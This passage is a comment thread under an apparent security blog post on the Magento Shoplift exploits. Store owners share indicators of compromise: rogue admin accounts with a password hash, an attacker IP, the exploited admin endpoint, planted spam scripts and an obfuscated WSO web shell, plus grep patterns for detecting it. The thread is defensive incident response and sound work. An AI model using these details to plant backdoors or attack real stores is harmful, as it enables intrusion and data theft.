			<p>I also found the /media/dhl/info.php and /media/dhl/.htaccess. Weird though, it seems that the info.php has the ability to eval arbitrary php code that is passed in but my apache access logs don&#8217;t show and POSTs to that file. But there were a lot of requests to /get.php/media/dhl/.htaccess, which I guess is a way to get the contents of that .htaccess file. :/ Not sure what to make of it, but needed to be cleaned up regardless.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-6323">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/44959031636a4a6121710ab213d27038?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/44959031636a4a6121710ab213d27038?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">SawBladePainter</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-05T19:34:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6323">May 5, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Yep my client&#8217;s 1.8.1 site got hacked on 4/23 and then again by someone else on 4/26. </p>
<p>#	modified:   app/code/core/Mage/Cms/controllers/IndexController.php<br />
#	modified:   downloader/cache.cfg<br />
#	modified:   downloader/pearlib/php/PEAR/Command/Mage.php<br />
#	modified:   downloader/pearlib/php/PEAR/Installer/Role/Mage.php<br />
#	modified:   lib/Varien/Db/Adapter/Pdo/Mysql.php</p>
<p>ADDED:<br />
#	app/code/community/Magpleasure/<br />
#	app/design/adminhtml/default/default/layout/filesystem.xml<br />
#	app/design/adminhtml/default/default/template/filesystem/<br />
#	app/etc/modules/Magpleasure_Filesystem.xml<br />
#	downloader/.cache/community/File_System-1.0.0.tgz<br />
#	js/editarea/<br />
#	js/filesystem/<br />
#	skin/adminhtml/default/default/filesystem/</p>
<p>PW HASH/SALT:<br />
f4c8e326312d5ddb79c04b408e55010a:rp</p>
<p>FOUR LETTER USERNAMES + <a href="mailto:email@example.com">email@example.com</a></p>
<p>How do we figure out whether they downloaded the database or config files, etc.?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-6324">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">ifnull</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-05T21:42:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6324">May 5, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>You should check your Apache access logs. Look at the transfer size and compare it to the size of your backups.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-3" id="comment-6365">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/13278486f2332e3d9f1b3452d9a6ed0f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/13278486f2332e3d9f1b3452d9a6ed0f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Trim</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-13T21:28:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6365">May 13, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi,</p>
<p>recently I noticed many files exported to var/export. They only contain first line: ID,&#8221;x&#8221;,x,x</p>
<p>I have never done any exports from within Magento!</p>
<p> Does anyone have an idea on how to check what has caused these csv files to be generated in var/export directory??</p>
<p>How do I figure out whether they downloaded the dB or config files, emails, etc</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-4" id="comment-6367">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/eddc84bac0cc1a2b23b2b20f88f1634b?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/eddc84bac0cc1a2b23b2b20f88f1634b?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">tarrmrob</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-14T20:36:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6367">May 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Is it normal to have csv files in /includes/stat/</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-6368">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/eddc84bac0cc1a2b23b2b20f88f1634b?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/eddc84bac0cc1a2b23b2b20f88f1634b?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">tarrmrob</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-14T20:42:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6368">May 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>In what way was it modified? downloader/cache.cfg</p>
<p>How to fix this file?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-3" id="comment-6372">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/44959031636a4a6121710ab213d27038?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/44959031636a4a6121710ab213d27038?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">SawBladePainter</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-15T20:52:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6372">May 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I don&#8217;t recall how it was modified. I could look it up if you really need to know. But anyway just reset to your latest known good commit:</p>
<p>cd /your/working/directory<br />
git reset &#8211;hard </p>
<p>Or restore the files from a backup. </p>
<p>If you&#8217;re not using git on your project, and don&#8217;t back up your files, well… let me know and I&#8217;ll dig up the diff on that file so you can see what was done, I guess.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-6620">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/efe6dbeabdcb4113433e3916b53ea400?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/efe6dbeabdcb4113433e3916b53ea400?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://mkleine.de" class="comment-author-link" rel="external nofollow" itemprop="url">Matthias Kleine</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-07-30T11:00:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6620">July 30, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>OMG just found MagPleasure, too. Thought that was a module installed by our customer. Thank you very much for sharing!</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-6327">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/1d5d165056817c209889538134a65e37?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/1d5d165056817c209889538134a65e37?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Grrring Bassmo</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-06T13:25:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6327">May 6, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Would like to confirm that have also seen an admin user with a random 4 letter name and <a href="mailto:email@example.com">email@example.com</a>.  This has gone along with the Magpleasure/Filesystem extension installation.  Not sure what else yet.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-6339">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/1b35d22752ac7d7d0eedaf51b13d8e2e?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/1b35d22752ac7d7d0eedaf51b13d8e2e?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Grrring Bassmo</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-07T09:35:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6339">May 7, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Following further investigation and finding a second compromised site here are some more snippets of information.</p>
<p>One of the files that the patch fixes is &#8220;lib/Varien/Db/Adapter/Pdo/Mysql.php&#8221;.  However this file had been modified during the exploit and the patch would not fully complete as the file had been changed.  Was able to resolve this by replacing the file and re-running the patch.</p>
<p>One thing of some concern is that the var/export folder on both compromised sites have been full of csv exports. This suggests that a lot of data has been snatched. This has happened in both a v1.9 and a v1.5 build.</p>
<p>Also, one site had 3 new admins created, two using the @example.com address but also one with a different address &#8211; something along the lines of system_backup (sorry I deleted it quickly).  This was in an old  v1.5.1 .</p>
<p>Remember to change your database passwords guys &#8211; if they have been able to see your local.xml file that is now no longer a secret.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-6340">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/1b35d22752ac7d7d0eedaf51b13d8e2e?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/1b35d22752ac7d7d0eedaf51b13d8e2e?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Grrring Bassmo</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-07T09:45:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6340">May 7, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>So far all csvs appear to contains only product data</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-6342">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/1b35d22752ac7d7d0eedaf51b13d8e2e?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/1b35d22752ac7d7d0eedaf51b13d8e2e?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Grrring Bassmo</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-07T13:38:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6342">May 7, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Can also recommend changing all existing admin passwords, possibly the usernames too from any compromised site.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-6362">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/b09f5740e14bffd4541bf7bac06b3408?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b09f5740e14bffd4541bf7bac06b3408?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">M.Hutchinson</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-13T01:49:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6362">May 13, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Assuming that another action item is to reset all user passwords &amp; email users, is it possible that a handful of user account email addresses have been changed? Would be interesting to do a compare of user email records pre&amp;post hack to see what comes up.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6361">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/2c3788337ec9d48eade5c4336453cee9?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/2c3788337ec9d48eade5c4336453cee9?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">jasonyohon</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-12T21:54:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6361">May 12, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Exploit installed MA2 Slideshow Plugin (bizarrely) &#8211; IP was in the USA 23.245.26.35 &#8211; added ma2all.js which seems like some sort of listener. Scary stuff.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-6366">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/13278486f2332e3d9f1b3452d9a6ed0f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/13278486f2332e3d9f1b3452d9a6ed0f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Trim</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-13T21:31:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6366">May 13, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi,</p>
<p>recently I noticed many files exported to var/export. They only contain first line: ID,&#8221;x&#8221;,x,x</p>
<p>I have never done any exports from within Magento!</p>
<p> Does anyone have an idea on how to check what has caused these csv files to be generated in var/export directory??</p>
<p>How do I figure out whether they downloaded the dB or config files, emails, etc</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6371">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-15T17:49:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6371">May 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>A brand new set of security patches today!  Get them installed right away people.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-6384">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/9099e2f12ec5af6105377f1791f09e6a?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/9099e2f12ec5af6105377f1791f09e6a?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Rick Buczynski</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-19T20:54:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6384">May 19, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>On one store, I just found a nasty WSO php shell injected into errors/report.php. It allows complete system surveying, code execution, and MySQL controls. Try to run `grep -rn &#8216;WSOsetcookie&#8217; .` on your store for clues.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-6386">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Shaun Ek</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-21T05:30:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6386">May 21, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>HOLY CRAP, I just found this one as well and it is CRAZY!!!!!!!! The power of this script is really astounding, and impressive, but mostly scary what it can do. I HIGHLY encourage people to run Rick&#8217;s grep command to find, but if it doesn&#8217;t come back with anything run this one, which works for the version found on my server </p>
<p>grep -rn &#8216;xxtea_encrypt&#8217; .</p>
<p>(the version on our server was obfuscated by base64 encoding plus some lame php encryption so that is why grep -rn &#8216;WSOsetcookie&#8217; . didn&#8217;t work for me)</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-3" id="comment-6389">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/9099e2f12ec5af6105377f1791f09e6a?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/9099e2f12ec5af6105377f1791f09e6a?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Rick Buczynski</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-21T13:03:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6389">May 21, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks for sharing Shaun &#8212; definitely good insight about encoded variations of the shell. FYI, I have only seen it once among about a dozen stores I&#8217;ve checked, while some stores have still been compromised under different methods.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6404">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f07daf21df15713ecb00b2191de536e1?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f07daf21df15713ecb00b2191de536e1?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Sean</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-27T17:06:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6404">May 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>This guy is using the SUPEE-5994 exploits that are able to expose user account data. You have another patch to apply.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-6409">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/2c3788337ec9d48eade5c4336453cee9?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/2c3788337ec9d48eade5c4336453cee9?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">jasonyohon</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-28T15:00:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6409">May 28, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Since this exploit I have changed all my admin links to something other than index.php/admin which I obviously should have done years ago. But can anyone confirm if this simple change would have eliminated the capability of the exploit? It seems to me that the hackers/bots could not guess where to run the &#8220;POST /index.php/admin/Cms_Wysiwyg&#8221;  command had the admin folder been changed to something random. Am I wrong about this?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6430">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/acb20efdbb1bfb02ee27394b39c01a77?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/acb20efdbb1bfb02ee27394b39c01a77?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">jamesbloob</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-06-02T13:38:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6430">June 2, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>On one of our sites that was compromised a user was added to admin_user with username Inuf and Password f4c8e326312d5ddb79c04b408e55010a:rp  email was <a href="mailto:email@example.com">email@example.com</a></p>
<p>We found two files so far one was /skin/adminhtml/default/default/images/lanot/filemanager/beaks.php and the other was /js/tiny_mce/classes/firebug/press36.php these two files were sending out spam emails from our site. We are still investigating what else was changed. </p>
<p>We will probably have to restore the site to a previous backup as we do not know what else could have been affected.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-6741">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/cc5f4214458b51c9cef7cdec251d5ae9?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/cc5f4214458b51c9cef7cdec251d5ae9?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Max</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-09-25T10:57:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6741">September 25, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>When I click on the CMS &#8212;&gt;PAGES &#8212;&gt; edit Home Page  appear a web page: Site in maintenance Mode&#8212;Varnish Cache</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6976">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/a29d5afc763cf00694d904ad37deab16?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/a29d5afc763cf00694d904ad37deab16?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Manu Vincent</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-11-18T08:14:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6976">November 18, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>One of my clients magento store got hacked. search result from frontend goes to WSO. I am a newbie to magento. what i know is just to configure magento. PLease help</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-6981">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/57a6c5f9e541605416a1af22e396b728?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/57a6c5f9e541605416a1af22e396b728?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Eugene</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-11-20T11:28:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6981">November 20, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>why there are so many exploits on magento&#8230;.it is crazy to patch magento all the time&#8230;.lord</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-8024">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6b7113749d118c0b9bc3abf193291b7a?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6b7113749d118c0b9bc3abf193291b7a?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Ad Kc</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-11-22T16:25:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-8024">November 22, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>It&#8217;s little late, but here is the qst. Did you guys see any exploitation on database? It&#8217;s hard to re-build the site without the existing database. What are the risk, if I use same database in new installation?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ol></div></main><aside class="sidebar sidebar-primary widget-area" role="complementary" aria-label="Primary Sidebar" itemscope itemtype="https://schema.org/WPSideBar" id="genesis-sidebar-primary"><h2 class="genesis-sidebar-title screen-reader-text">Primary Sidebar</h2><div class="sidebar-primary-wrap"><section id="text-5" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Socialize With Sucuri</h3>
			<div class="textwidget"><p>We're actively engaged across multiple platforms. Follow us and let's connect!</p>
<ul class="social-icons">
<li><a target="_blank" href="https://www.facebook.com/SucuriSecurity" rel="noopener"><span class="screen-reader-text">Facebook</span></a></li>
<li><a target="_blank" href="https://twitter.com/sucurisecurity" rel="noopener"><span class="screen-reader-text">Twitter</span></a></li>
<li><a target="_blank" href="https://www.linkedin.com/company/sucuri-security" rel="noopener"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a target="_blank" href="https://www.youtube.com/c/sucurinet" rel="noopener"><span class="screen-reader-text">YouTube</span></a></li>
<li><a target="_blank" href="https://www.instagram.com/sucurisecurity/" rel="noopener"><span class="screen-reader-text">Instagram</span></a></li>
<li><a target="_blank" href="https://blog.sucuri.net/feed/" rel="noopener"><span class="screen-reader-text">RSS Feed</span></a></li>
</ul>
</div>
		</div></section>
<section id="search-3" class="widget widget_search"><div class="widget-wrap"><form class="search-form" method="get" action="https://blog.sucuri.net/"><label class="search-form-label screen-reader-text" for="searchform-62ea5214cca6d">Search the blog</label><input type="search" name="s" id="searchform-62ea5214cca6d" placeholder="Search the blog" /><input type="submit" value="Search" /></form></div></section>
<section id="text-19" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/how-to-clean-hacked-magento-site?utm_source=Blog&#038;utm_medium=WidgetLogic&#038;utm_campaign=Webinar&#038;utm_term=EN&#038;utm_content=Hacked-Magento" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23283 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/04/blog-sidebar_widgetlogic_webinars_hacked-magento.png" alt="Magento Webinar" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-25" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/guides/magento-security?utm_source=Blog&#038;utm_medium=WidgetLogic&#038;utm_campaign=Guide&#038;utm_term=EN&#038;utm_content=Magento-Security" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23344 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_guides_magento-security.png" alt="Magento Security Guide" width="250" height="352" /></a></p>
</div>
		</div></section>
